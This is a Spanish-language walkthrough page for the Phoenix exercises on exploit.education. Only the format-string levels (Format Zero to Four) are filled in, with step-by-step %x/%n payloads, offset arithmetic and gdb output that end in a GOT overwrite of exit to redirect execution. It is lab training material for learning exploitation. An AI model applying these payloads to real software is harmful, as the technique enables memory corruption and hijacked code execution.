---

layout: default
title: "Phoenix-Exploit Education"
permalink: /Phoenix-EE/
---

# Phoenix-Exploit Education

## Stack Zero
## Stack One
## Stack Two
## Stack Three
## Stack Four
## Stack Five
## Stack Six

## Format Zero

Como hablamos de formatos, nos referimos a los que tienen **%** como por ejemplo **%s**, **%i**, **%p**, **%x** o **%d** entre otros. En este caso usaremos **%x**, unas cuantas veces para formar el  error del bug.

Ahora haremos lo siguiente:

```bash
$ python -c "print '%x'*20" | ./format-zero

Welcome to phoenix/format-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```

## Format One

```bash
$ python -c "print '%32x\x6c\x4f\x76\x45'" | ./format-one 
Welcome to phoenix/format-one, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed correctly!

```

## Format Two

```bash
user@phoenix-amd64:~$ nm /opt/phoenix/i486/format-two | grep changeme
08049868 B changeme

user@phoenix-amd64:~$ /opt/phoenix/i486/format-two AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
Welcome to phoenix/format-two, brought to you by https://exploit.education
AAAA.ffffd89c.100.0.f7f84b67.ffffd6f0.ffffd6d8.80485a0.ffffd5d0.ffffd89c.100.3e8.41414141.Better luck next time!

user@phoenix-amd64:~$ /opt/phoenix/i486/format-two $(echo -e "\x68\x98\x04\x08%x%x%x%x%x%x%x%x%x%x%x%n.")
Welcome to phoenix/format-two, brought to you by https://exploit.education
hffffd8a81000f7f84b67ffffd700ffffd6e880485a0ffffd5e0ffffd8a81003e8.Well done, the 'changeme' variable has been changed correctly!
```

## Format Three

Empezaremos con obtener la direccion de la variable **changeme** y luego vemos cuando **%x** hay que agregar para que salgan nuestras **AAAA**.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ nm ./format-three | grep changeme
08049844 B changeme

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print 'AAAA'+'%x '*12" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
AAAA0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 41414141 
Better luck next time - got 0x00000000, wanted 0x64457845!
```

Ahora restamos un **%x** y lo reemplazamos por un **%n**. Tambien a su vez cambiamos las **AAAA** por la direccion de memoria de donde apunta nuestra variable **changeme**. 

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'%x '*12" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
D0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 8049844 
Better luck next time - got 0x00000000, wanted 0x64457845!

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'%x '*11+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
D0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 
Better luck next time - got 0x00000045, wanted 0x64457845!
```

Como podemos ver, hemos escrito en el byte primero pero, nos faltan 3 bytes mas. Entonces ingresaremos en la parte de adelante las otras direcciones (de los siguientes 3 bytes) para ver cual es el resultado.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 
Better luck next time - got 0x00000051, wanted 0x64457845!
```

Como podemos ver, se a desplazado los bytes, por ello, lo que haremos será usar esta informacion para desplazar caracteres usando **A**. Haciendo un pequeño calculo, necesitamos saber cuantas **A** se necesita agregar para que 45 llegue a 51, entonces hariamos una pequeña resta de 45-51, pero como esto nos da una resta negativa, pero si sobrepasa el byte no nos importa puesto que eso podemos arreglarlo en el siguiente byte. Entonces haremos la resta de 145-51.

```bash
>>> int("145",16)-int("51",16)
244

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x00000145, wanted 0x64457845!
```

Luego agregamos el siguiente %n para ver, como se encuentra nuestro segundo byte al sobrescribir.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x00014545, wanted 0x64457845!
```

Ahora, realizamos lo mismo con el siguiente byte, lo cual seria 78-45.

```bash
>>> int("78",16)-int("45",16)
51

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x00017845, wanted 0x64457845!
```

Y volvemos a hacer lo mismo para el siguiente byte.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x01787845, wanted 0x64457845!

>>> int("145",16)-int("78",16)
205

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'A'*205+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x02457845, wanted 0x64457845!
```

Y para el ultimo byte.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'A'*205+'%n'+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x45457845, wanted 0x64457845!

>>> int("64",16)-int("45",16)
31

user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'+'A'*51+'%n'+'A'*205+'%n'+'A'*31+'%n'" |./format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed correctly!
```

## Format Four

El siguiente codigo:

```c
/*
 * phoenix/format-four, by https://exploit.education
 *
 * Can you affect code execution? Once you've got congratulations() to
 * execute, can you then execute your own shell code?
 *
 * Did you get a hair cut?
 * No, I got all of them cut.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

void bounce(char *str) {
  printf(str);
  exit(0);
}

void congratulations() {
  printf("Well done, you're redirected code execution!\n");
  exit(0);
}

int main(int argc, char **argv) {
  char buf[4096];

  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);
}
```

Obteniendo las direcciones utiles.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ nm ./format-four | grep congrat
08048503 T congratulations

user@phoenix-amd64:/opt/phoenix/i486$ objdump -R ./format-four | grep exit
080497e4 R_386_JUMP_SLOT   exit -> 51515151
```

Como en el ejemplo anterior, llenaremos de **%x**, para verificar si encontramos los hexadecimales de las **AAAA**.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ python -c "print 'AAAA'+'%x '*12" |./format-four
Welcome to phoenix/format-four, brought to you by https://exploit.education
AAAA0 0 0 f7f81cf7 f7ffb000 ffffd738 804857d ffffc730 ffffc730 fff 0 41414141
```

  Como ya vimos en el **Format Three**, manejaremos un archivo llamado script.py en el directorio /tmp. Y empezaremos escribiendo el script con los valores que ya obtuvimos.

```python
#!/bin/python

buf ='\x08\x04\x97\xe4'[::-1]
buf+='\x08\x04\x97\xe5'[::-1]
buf+='\x08\x04\x97\xe6'[::-1]
buf+='\x08\x04\x97\xe7'[::-1]
buf+='%x '*11
buf+='A'*0+'%n'
buf+='A'*0+'%n'
buf+='A'*0+'%n'
buf+='A'*0+'%n'

print(buf)
```

Y luego lo que haremos será usar el gdb.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ gdb -q ./format-four 

#Luego ejecutamos el siguiente comando en la consola de gdb
(gdb) run < <(python /tmp/script.py)

#Podemos ver que el programa se paró y en el registro eip obtenemos lo siguiente.
$eip   : 0x51515151 ("QQQQ"?)
```

Nosotros queremos que el $eip apunte a: **08048503**. Entonces haremos lo mismo que en el ejemplo anterior.

```bash
>>> int("103",16)-int("51",16)
178

$ cat /tmp/script.py

#!/bin/python

buf ='\x08\x04\x97\xe4'[::-1]
buf+='\x08\x04\x97\xe5'[::-1]
buf+='\x08\x04\x97\xe6'[::-1]
buf+='\x08\x04\x97\xe7'[::-1]
buf+='%x '*11
buf+='A'*178+'%n'
buf+='A'*0+'%n'
buf+='A'*0+'%n'
buf+='A'*0+'%n'

print(buf)

$eip   : 0x3030303
```

Y de la misma manera para los demas bytes.

```
#Para el segundo byte
>>> int("85",16)-int("03",16)
130
#Ejecutando el GDB de nuevo
$eip   : 0x85858503
#Lo que queremos
$eip   : 0x08048503

#Para el tercer byte
>>> int("104",16)-int("85",16)
127
#Ejecutando el GDB de nuevo
$eip   : 0x4048503
#Lo que queremos
$eip   : 0x08048503

#Para el cuarto y ultimo byte
>>> int("08",16)-int("04",16)
4
#Ejecutando el GDB de nuevo
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
...
```

## Heap Zero
## Heap One
## Heap Two
## Heap Three
## Net Zero
## Net One
## Net Two
## Final Zero
## Final One
## Final Two

